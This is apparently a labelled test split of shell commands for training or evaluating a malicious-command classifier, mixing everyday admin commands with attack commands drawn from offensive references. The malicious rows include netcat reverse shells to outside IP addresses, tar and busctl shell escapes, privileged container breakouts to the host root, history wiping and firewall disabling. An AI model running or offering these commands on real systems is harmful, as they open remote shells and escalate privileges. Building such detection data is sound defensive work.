id,command,label,source,split
d1_013067,sudo nft list ruleset 2>/dev/null,1,hacktricks,test
d1_013070,rsync -a /var/www/html/ /backup/www/,0,bash6k,test
d1_013075,sngrep -I path/to/file.pcap,0,tldr,test
d1_013077,dos2unix windows.txt,0,bash6k,test
d1_013079,eselect locale list,0,tldr,test
d1_013080,/var/tmp/rootbash -p,1,hacktricks,test
d1_013081,./squashfs-root/sh -p,1,gtfobins,test
d1_013084,pw-v4l2 -h,0,tldr,test
d1_013085,ls -la /dev/shm 2>/dev/null | head -n 50,1,hacktricks,test
d1_013088,pacrepairdb package_name,0,tldr,test
d1_013090,head -n 20 product.html,0,bash_instruct,test
d1_013095,mv *.css vendor/,0,bash_instruct,test
d1_013100,nc -e /usr/bin/sh 184.151.253.89 26135,1,quasarnix,test
d1_013106,nmcli [d|device],0,tldr,test
d1_013107,sshfs user@host:/path /mnt,0,linlm,test
d1_013109,transfersh [-p|--progress] path/to/file,0,tldr,test
d1_013110,find /var/tmp/stuff -mtime +90 -exec /bin/rm {} \;,0,nl2bash,test
d1_013120,pug template.pug -o output.html,0,linlm,test
d1_013126,"find . -name ""*.zip"" -mtime +2 -print0 | xargs -0 -I {} rm {}",0,nl2bash,test
d1_013143,cat input_file | httprobe -p https:2222,0,tldr,test
d1_013147,gcloud config set property value,0,tldr,test
d1_013149,cat /etc/passwd |grep nobody,1,atomic_red_team,test
d1_013150,du -h project/* 2>/dev/null | sort -rh | head -n 5,0,bash_instruct,test
d1_013154,systemctl stop ufw,1,atomic_red_team,test
d1_013156,systemd-path --suffix suffix_string,0,tldr,test
d1_013158,vim -c ':py ...',1,gtfobins,test
d1_013159,"cowsay -e characters ""hello, world""",0,tldr,test
d1_013165,wc -c migration.tar.gz,0,bash_instruct,test
d1_013168,pg_dump [-a|--data-only] db_name > path/to/output_file.sql,0,tldr,test
d1_013174,yes | command-that-asks-for-input,0,nl2bash,test
d1_013182,mv users.jpg vendor/,0,bash_instruct,test
d1_013184,nice -n 15 rsync -a /data /mnt/backup,0,bash_instruct,test
d1_013188,foot [-o|--override] section.key=value,0,tldr,test
d1_013193,grep vmw /proc/modules,1,atomic_red_team,test
d1_013196,nl invoice.yaml,0,bash_instruct,test
d1_013198,"sed -n '10,20p' product.conf",0,bash_instruct,test
d1_013217,phpunit path/to/TestFile.php,0,tldr,test
d1_013237,cat audit.log,0,bash_instruct,test
d1_013242,find . -name *.txt -exec ls {} \;,0,nl2bash,test
d1_013254,fwconsole backup --list,0,tldr,test
d1_013261,sudo ip [l|link] [s|set] ethX mtu 9000,0,tldr,test
d1_013265,"grep -E -o ""\b(?:2131|1800|35d{3})d{11}\b"" *.txt > jcb.txt",1,hacktricks,test
d1_013280,setcap -v 'cap_net_raw' path/to/file,0,tldr,test
d1_013283,/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null,1,hacktricks,test
d1_013286,cat changelog.md | tail -n 15,0,bash_instruct,test
d1_013288,kubie ns namespace,0,tldr,test
d1_013291,sudo chown -R svc-app:www-data tests,0,bash_instruct,test
d1_013293,pnmtofiasco [-f|--config] path/to/fiascorc path/to/file.pnm > path/to/file.fiasco,0,tldr,test
d1_013296,"ps aux | grep memcached | grep -v grep | awk '{print $2, $4}'",0,bash_instruct,test
d1_013298,bzip2 file | tee -a logfile,0,nl2bash,test
d1_013299,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc",1,gtfobins,test
d1_013300,PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod',1,hacktricks,test
d1_013301,dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file,1,gtfobins,test
d1_013302,sudo tlp-stat --battery|disk|processor|graphics|pcie|rfkill|usb,0,tldr,test
d1_013309,stat -c '%y' script.sh | cut -d'.' -f1,0,bash6k,test
d1_013312,apx stacks list,0,tldr,test
d1_013327,"grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",1,atomic_red_team,test
d1_013336,adduser username,0,tldr,test
d1_013339,sudo systemctl start nginx,0,linlm,test
d1_013348,serialver -classpath path/to/directory classname1:classname2:...,0,tldr,test
d1_013356,tmux set-environment -u RBENV_VERSION,0,nl2bash,test
d1_013359,wev,0,tldr,test
d1_013360,"export JAVA_HOME=$(readlink -f /usr/bin/java | sed ""s:bin/java::"")",0,nl2bash,test
d1_013362,cp -p data.jpg lib/,0,bash_instruct,test
d1_013363,mknod backpipe p ; nc -l -p 8080 < backpipe | nc 138.97.48.102 80 >backpipe,1,slp,test
d1_013367,curl -x http://h51a737c8.example.net https://h0caaf24a.example.net,0,linlm,test
d1_013387,ls -d public/*/,0,bash_instruct,test
d1_013390,date -ud@0,0,nl2bash,test
d1_013399,sudo chgrp staff audit.log,0,bash_instruct,test
d1_013405,find /dev/sd*[a-z] -printf . | wc -c,0,nl2bash,test
d1_013417,bash: /usr/bin/gdb: Operation not permitted,1,hacktricks,test
d1_013425,nm /usr/bin/ls,0,linlm,test
d1_013427,rankmirrors [-u|--url] url,0,tldr,test
d1_013434,zathura,1,gtfobins,test
d1_013446,mpstat 2 5,0,tldr,test
d1_013451,xxd -l 64 summary.csv,0,bash_instruct,test
d1_013456,cat test.md | tail -n 15,0,bash_instruct,test
d1_013464,xxd -p file | tr -d '\n',0,nl2bash,test
d1_013473,cat /proc/self/uid_map 2>/dev/null,1,hacktricks,test
d1_013482,sed '/^$/d' summary.conf,0,bash_instruct,test
d1_013485,"sudo emacs -Q -nw --eval '(term ""/bin/sh &"")'",1,atomic_red_team,test
d1_013488,org.freedesktop.locale1 - - - (activatable) - -,1,hacktricks,test
d1_013491,sudo chown -R deploy:operators vendor,0,bash_instruct,test
d1_013493,"for d in `echo $PATH | tr "":"" ""\n""`; do find $d -name ""*.sh"" 2>/dev/null; done",1,hacktricks,test
d1_013498,tldr magick montage,0,tldr,test
d1_013502,cp -u migration.bak backup/,0,bash_instruct,test
d1_013511,find /res/values-en-rUS /res/xml -iname '*.xml',0,nl2bash,test
d1_013517,"pbmtextps [-du|-dump-ps] ""Hello World!"" > path/to/output.ps",0,tldr,test
d1_013522,sudo chown dave summary.zip,0,bash_instruct,test
d1_013539,cs resolve --tree group_id:artifact_id:artifact_version,0,tldr,test
d1_013547,sudo iscsiadm [-m|--mode] node [-o|--op] new [-T|--targetname] iqn [-p|--portal] ip_address:3260,0,tldr,test
d1_013549,podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh,1,gtfobins,test
d1_013572,file results.old,0,bash_instruct,test
d1_013575,cat transaction.yaml | sed 's/[[:space:]]*$//',0,bash_instruct,test
d1_013581,netstat -tn | grep app01.example.org,0,bash_instruct,test
d1_013587,vagrant halt id_or_name,0,tldr,test
d1_013590,gpclient disconnect,0,tldr,test
d1_013597,openssl rand -base64 12,0,bash6k,test
d1_013602,interdiff old_file new_file,0,tldr,test
d1_013604,autoflake --remove-all-unused-imports path/to/file1.py path/to/file2.py ...,0,tldr,test
d1_013605,zcmp path/to/file1.gz path/to/file2.gz,0,tldr,test
d1_013608,"local d,x=c:receive(""*a"");",1,gtfobins,test
d1_013610,find / -name foo.txt -type f -print,0,nl2bash,test
d1_013616,sort request.ini | uniq -c | sort -nr,0,bash_instruct,test
d1_013622,vim -c ':lua ...',1,gtfobins,test
d1_013625,cat output.txt | tail -n 15,0,bash_instruct,test
d1_013627,gcloud config unset property_name,0,tldr,test
d1_013629,echo '/path/to/command' >/path/to/temp-dir/bin/rustc,1,gtfobins,test
d1_013636,ceph pg repair pool_name,0,tldr,test
d1_013652,find /var -type f -size +100M -exec ls -lh {} + | sort -k5 -h,0,bash6k,test
d1_013659,mitmproxy --listen-host ip_address [-p|--listen-port] port,0,tldr,test
d1_013661,"ps -ef | grep ""authenticator""",1,hacktricks,test
d1_013663,sort -nr release.txt,0,bash_instruct,test
d1_013673,sudo apptainer config global [-r|--reset] directive,0,tldr,test
d1_013675,!shell_command,0,tldr,test
d1_013685,"""$SPLUNK_HOME/bin/splunk"" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'",1,hacktricks,test
d1_013689,doppler run path/to/command.sh,0,tldr,test
d1_013703,mv -n credentials.zip credentials.zip.old,0,bash_instruct,test
d1_013704,mkdir rootfs,1,hacktricks,test
d1_013707,awk '{print $9}' metrics.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_013710,tail -n 20 export.sql,0,bash_instruct,test
d1_013717,berks upload cookbook,0,tldr,test
d1_013723,b2sum path/to/file1 path/to/file2 ... > path/to/file.b2,0,tldr,test
d1_013747,cat /proc/self/mountinfo | head -n 50,1,hacktricks,test
d1_013752,"curl --unix-socket /var/run/docker.sock -H ""Content-Type: application/json"" -d '{""Image"":""ubuntu:24.04"",""HostConfig"":{""CapAdd"":[""SYS_ADMIN""]}}' http:/v1.41/containers/create",1,hacktricks,test
d1_013755,export HISTFILE=/dev/null,1,hacktricks,test
d1_013759,sudo unshare --net --fork bash,1,hacktricks,test
d1_013761,xxd -l 64 release.sql,0,bash_instruct,test
d1_013762,grep -oE '(INFO|WARN|ERROR|DEBUG)' build.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_013764,file payment.json,0,bash_instruct,test
d1_013768,tr 'a-z' 'A-Z' < event.md,0,bash_instruct,test
d1_013778,cat config.tsv | sed 's/[[:space:]]*$//',0,bash_instruct,test
d1_013792,sudo chown postgres backup.js,0,bash_instruct,test
d1_013793,tre [-a|--all] [-c|--color] automatic|always|never,0,tldr,test
d1_013805,sudo nft -a list chain inet filter input,1,hacktricks,test
d1_013813,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file",1,gtfobins,test
d1_013818,netserver,0,tldr,test
d1_013824,logsave -a logfile command,0,tldr,test
d1_013826,cat results.json | grep -v '^$',0,bash_instruct,test
d1_013827,"ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b ""CN=Users,DC=example,DC=com"" ""(objectClass=group)"" -s sub -a always -z 1000 dn",1,atomic_red_team,test
d1_013835,semanage login -l 2>/dev/null,1,hacktricks,test
d1_013838,gphoto2 [-P|--get-all-files] --new,0,tldr,test
d1_013839,docker exec -it web /bin/sh,1,hacktricks,test
d1_013841,sudo route add -net ip_address netmask netmask_address gw gw_address,0,tldr,test
d1_013848,nl schema.js,0,bash_instruct,test
d1_013850,sed -i 's/enabled/7.98.246.159/g' build.md,0,bash_instruct,test
d1_013858,paste -sd: INPUT.txt,0,nl2bash,test
d1_013870,yay -S pycharm-professional,0,linlm,test
d1_013871,cp dump.yaml modules/,0,bash_instruct,test
d1_013874,nc -c bash 15.22.101.194 4242,1,payloads,test
d1_013880,typeorm migration:create --name migration_name,0,tldr,test
d1_013890,semanage fcontext -C -l 2>/dev/null,1,hacktricks,test
d1_013891,phpcs path/to/directory --report format,0,tldr,test
d1_013892,"execve(paramList[0], paramList, NULL);",1,hacktricks,test
d1_013893,krita --nosplash,0,tldr,test
d1_013901,echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0,1,atomic_red_team,test
d1_013902,cat users.tsv | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_013905,echo $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded,1,atomic_red_team,test
d1_013908,xxd -l 64 request.png,0,bash_instruct,test
d1_013913,find /etc -type f -print0 2>/dev/null | xargs -0 grep --color=AUTO -Hn 'nameserver' 2>/dev/null,0,nl2bash,test
d1_013916,chmod +x /path/to/temp-file,1,gtfobins,test
d1_013923,pr +2:5 [-l|--length] page_length path/to/file1 path/to/file2 ...,0,tldr,test
d1_013934,touch changelog.jpg,0,bash_instruct,test
d1_013935,CapPrm: 00000000a80425fb,1,hacktricks,test
d1_013938,mv product.log product.log.old,0,bash_instruct,test
d1_013939,swc path/to/input_directory [-d|--out-dir] path/to/output_directory,0,tldr,test
d1_013948,wc -l metrics.tar.gz,0,bash_instruct,test
d1_013956,systemctl link /tmp/atomic_tmp.service,1,atomic_red_team,test
d1_013970,htb.oouch.Block interface - - -,1,hacktricks,test
d1_013973,ls -l /proc/self/ns/cgroup,1,hacktricks,test
d1_013975,cmatrix -r,0,tldr,test
d1_013976,openssl genrsa -out rootCA.key 4096,1,atomic_red_team,test
d1_013980,sudo eclean [-d|--deep] [-n|--package-names] packages,0,tldr,test
d1_013989,:e /path/to/input-file,1,gtfobins,test
d1_013992,faker [-r|--repeat] number [-l|--lang] en_AU|en_US|... city -o path/to/file.txt,0,tldr,test
d1_013999,yay -S android-studio,0,linlm,test
d1_014002,opencode db '...',1,gtfobins,test
d1_014003,"date ; read -t 10 -p ""Hit ENTER or wait ten seconds"" ; echo ; date",0,nl2bash,test
d1_014006,"grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' mixed.log | sort | uniq -c | sort -nr | head -n10",0,bash6k,test
d1_014009,eselect profile list,0,tldr,test
d1_014011,uudecode path/to/encoded_file,0,tldr,test
d1_014015,sudo chown -R redis:mysql artifacts,0,bash_instruct,test
d1_014018,"kitty --title ""title""",0,tldr,test
d1_014021,sudo chown -R www-data:www-data tests,0,bash_instruct,test
d1_014024,twine upload --verbose dist/*,0,tldr,test
d1_014029,docker system events,0,tldr,test
d1_014033,uniq -c auth.log,0,bash_instruct,test
d1_014041,pg_restore [-l|--list] archive_file.dump,0,tldr,test
d1_014049,ncat --udp 15.22.101.194 4242 -e /bin/bash,1,payloads,test
d1_014053,"find ""$DIR_TO_CLEAN"" -mtime +$DAYS_TO_SAVE -exec rm {} \;",0,nl2bash,test
d1_014055,shiori import path/to/bookmarks.html,0,tldr,test
d1_014057,"ip -o -4 addr show | awk '{print $2, $4}'",1,hacktricks,test
d1_014059,service art-test start,1,atomic_red_team,test
d1_014062,"ping 84.166.54.191 | sed -u 's/^.*time=//g; s/ ms//g' | ttyplot -t ""ping to 84.166.54.191"" -u ms",0,tldr,test
d1_014066,systemctl start lxc-net,0,tldr,test
d1_014074,mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null,1,hacktricks,test
d1_014075,stern . --container-state running|waiting|terminated,0,tldr,test
d1_014078,prometheus --version,0,linlm,test
d1_014083,ifstat -i eth0 1,0,bash6k,test
d1_014088,ascii -x,0,tldr,test
d1_014098,electrum verifymessage address signature message,0,tldr,test
d1_014105,ppmtomitsu [-m|-media] A|A4|AS|A4S path/to/file.ppm > path/to/file.mitsu,0,tldr,test
d1_014106,"find /store/01 -name ""*.fits""",0,nl2bash,test
d1_014108,certutil -K -d . -f path/to/password_file.txt,0,tldr,test
d1_014109,sort -k2 -n auth.ini,0,bash_instruct,test
d1_014113,ghcup set ghc version,0,tldr,test
d1_014119,clamscan [-d|--database] path/to/database_file_or_directory,0,tldr,test
d1_014124,cbt read table_name start=start_row_key end=end_row_key keys-only=true,0,tldr,test
d1_014136,sudo runuser user [-c|--command] 'command',0,tldr,test
d1_014137,bash -p,1,gtfobins,test
d1_014139,2024/02/01 22:02:10 CMD: UID=0 PID=17883 | sshd: [accepted],1,hacktricks,test
d1_014144,"screen -list | grep -q ""myscreen""",0,nl2bash,test
d1_014147,make /tmp/hello,1,atomic_red_team,test
d1_014150,ncspot [-c|--config] file_name,0,tldr,test
d1_014151,yay -S nomachine,0,linlm,test
d1_014152,find . -name .snapshot -prune -o \( \! -name *~ -print0 \) | cpio -pmd0 /dest-dir,0,nl2bash,test
d1_014157,virsh -c qemu:///system pool-destroy x,1,gtfobins,test
d1_014162,"touch /host/tmp/ht_test 2>/dev/null && echo ""host write works""",1,hacktricks,test
d1_014174,ldc2 -h,0,tldr,test
d1_014180,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",1,gtfobins,test
d1_014188,"kinit -X X509_user_identity=FILE:srv.pem,private.key test/srv.domain.local@DOMAIN.LOCAL",1,hacktricks,test
d1_014193,monolith url [-v|--no-video],0,tldr,test
d1_014210,sudo nmap -sSV -p- 39.237.139.187 -oA OUTPUTFILE -T4,1,payloads,test
d1_014212,ncat --sctp -lvp 4242,1,payloads,test
d1_014213,cat report.conf | wc -l,0,bash_instruct,test
d1_014219,rsync -avn downloads/ assets/,0,bash_instruct,test
d1_014223,gunzip kern.log.gz,0,bash_instruct,test
d1_014224,codec => rubydebug,1,hacktricks,test
d1_014227,ls -l /etc/localtime,0,linlm,test
d1_014228,"awk -F: '$3>=1000 {print $1}' /etc/passwd | xargs -n1 lastlog -u | tail -n +2 | sort -k4,5 -r | awk '{print $1"" ""$4"" ""$5}'",0,bash6k,test
d1_014240,"find . -type f | sed 's/.*/""&""/' | xargs ls -E | awk '{ print $6,"" "",$7,"" "",$9 }' | sort | tail -1",0,nl2bash,test
d1_014254,terminal-notifier -message 'Imported 42 contacts.' -activate com.apple.AddressBook,0,tldr,test
d1_014271,nxcdb --create-workspace workspace_name,0,tldr,test
d1_014276,soupault --config config_path --site-dir input_directory --build-dir output_directory,0,tldr,test
d1_014280,cp -p auth.bak releases/,0,bash_instruct,test
d1_014286,zabbix_agentd [-c|--config] path/to/zabbix_agentd.conf,0,tldr,test
d1_014287,sudo mount -o loop backup.iso /mnt,0,linlm,test
d1_014303,"if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi",1,atomic_red_team,test
d1_014308,find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null,1,hacktricks,test
d1_014325,hddtemp SATA:/dev/sda,0,tldr,test
d1_014332,screencapture -C path/to/file.png,0,tldr,test
d1_014349,ss -ulnp,0,bash_instruct,test
d1_014351,pacstrap path/to/new_root base base-devel linux-lts,0,tldr,test
d1_014355,tldr umount,0,tldr,test
d1_014358,tar -xzf example.tar.gz,0,bash6k,test
d1_014361,dnf config-manager [--enable|--set-enabled] repository_id,0,tldr,test
d1_014363,ssh -L 1234:remote2:22 -p 45678 user1@remote1,0,nl2bash,test
d1_014364,mupdf path/to/file,0,tldr,test
d1_014367,cloc --diff path/to/directory1 path/to/directory2,0,tldr,test
d1_014368,i3status -h,0,tldr,test
d1_014369,stress-ng [-a|--all] 1 [-t|--timeout] 2m,0,tldr,test
d1_014386,chsh -s /bin/bash john,0,bash6k,test
d1_014387,"if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi",1,atomic_red_team,test
d1_014390,nmap -sT -Pn --open 159.18.29.250/24,1,hacktricks,test
d1_014392,find /usr -maxdepth 1 -print,0,nl2bash,test
d1_014394,find /root/Maildir/ -mindepth 1 -type f -mtime +14 | xargs rm,0,nl2bash,test
d1_014397,find /path -xdev -printf '%i %TY-%Tm-%Td %TH:%TM %p\n' 2>/dev/null | sort -n | tail -n 50,1,hacktricks,test
d1_014398,dnote view,0,tldr,test
d1_014399,chown -R tomcat7:tomcat7 webapps temp logs work conf,0,nl2bash,test
d1_014401,sudo tlmgr install package,0,tldr,test
d1_014403,grep -c 'disk full' worker.log | cat,0,bash_instruct,test
d1_014405,accelerate estimate-memory name/model,0,tldr,test
d1_014408,pvecm [n|nodes],0,tldr,test
d1_014414,NAME TYPE SIGNATURE RESULT/VALUE FLAGS,1,hacktricks,test
d1_014417,2024/02/01 22:02:10 CMD: UID=0 PID=17884 | sshd: [accepted],1,hacktricks,test
d1_014418,cp -u release.py fixtures/,0,bash_instruct,test
d1_014420,mount | grep -q ~/mnt/sdc1,0,nl2bash,test
d1_014444,gcloud auth login,0,tldr,test
d1_014464,sudo rmmod demo,1,hacktricks,test
d1_014465,hledger print [-f|--file] path/to/foo.journal [-o|--output-file] path/to/output_file.csv,0,tldr,test
d1_014468,readlink -f /path/to/link,1,hacktricks,test
d1_014473,mullvad account set account_number,0,tldr,test
d1_014475,find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null,1,hacktricks,test
d1_014476,docker run --rm -it --privileged -u root alpine,1,gtfobins,test
d1_014483,jpegoptim image.jpg,0,linlm,test
d1_014490,id carol,0,bash_instruct,test
d1_014493,sudo pacman -S android-sdk android-sdk-build-tools android-sdk-platform-tools,0,linlm,test
d1_014494,darkhttpd path/to/docroot --port port,0,tldr,test
d1_014495,curl -XPOST MTExLTExLTExMTE=.redcanary.com,1,atomic_red_team,test
d1_014496,npm [c|config] get key,0,tldr,test
d1_014501,openscad -o path/to/button.stl path/to/button.scad,0,tldr,test
d1_014505,locust [-H|--host] http://h0caaf24a.example.net,0,tldr,test
d1_014506,sphinx-build [-b|--builder] html|epub|text|latex|man|... path/to/source_directory path/to/build_directory,0,tldr,test
d1_014512,wc -c invoice.pdf,0,bash_instruct,test
d1_014515,repomix --remote https://hc2208abd.example.net/user/repo/commit/836abcd7335137228ad77feb28655d85712680f1,0,tldr,test
d1_014523,stat summary.tmp,0,bash_instruct,test
d1_014535,mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak,1,hacktricks,test
d1_014537,pw user mod art -e +99d,1,atomic_red_team,test
d1_014545,"find . -name ""*.undo"" -ls | perl -lane '$t += $F[6]; END{print $t}'",0,nl2bash,test
d1_014550,HELPER=helper,1,hacktricks,test
d1_014551,cat myfile.txt | wc -l,0,nl2bash,test
d1_014552,conda config --show,0,tldr,test
d1_014557,mist list installer --include-betas,0,tldr,test
d1_014563,wc -l metrics.png,0,bash_instruct,test
d1_014570,tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,1,gtfobins,test
